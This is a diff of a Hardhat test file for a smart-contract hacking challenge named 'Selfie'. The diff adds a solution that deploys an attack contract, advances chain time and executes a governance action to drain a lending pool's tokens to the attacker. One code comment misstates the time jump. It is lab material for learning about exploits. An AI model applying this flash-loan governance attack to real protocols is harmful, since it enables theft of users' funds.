@@ -1,12 +1,16 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const {
+    ethers
+} = require('hardhat');
+const {
+    expect
+} = require('chai');
 
 describe('[Challenge] Selfie', function () {
     let deployer, attacker;
 
     const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
     const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
-    
+
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
@@ -19,7 +23,7 @@ describe('[Challenge] Selfie', function () {
         this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
         this.pool = await SelfiePoolFactory.deploy(
             this.token.address,
-            this.governance.address    
+            this.governance.address
         );
 
         await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
@@ -31,6 +35,21 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const AttackFactory = await ethers.getContractFactory("SelfieAttack", attacker);
+        const attackContract = await AttackFactory.deploy(this.pool.address, this.token.address, attacker.address);
+
+        await attackContract.attack();
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days
+
+        const attackGovernenceContract = this.governance.connect(attacker);
+        const actions = await attackGovernenceContract.actions(1);
+
+        console.log(actions);
+        await attackGovernenceContract.executeAction(1);
+
+
+
     });
 
     after(async function () {
@@ -39,7 +58,7 @@ describe('[Challenge] Selfie', function () {
         // Attacker has taken all tokens from the pool
         expect(
             await this.token.balanceOf(attacker.address)
-        ).to.be.equal(TOKENS_IN_POOL);        
+        ).to.be.equal(TOKENS_IN_POOL);
         expect(
             await this.token.balanceOf(this.pool.address)
         ).to.be.equal('0');
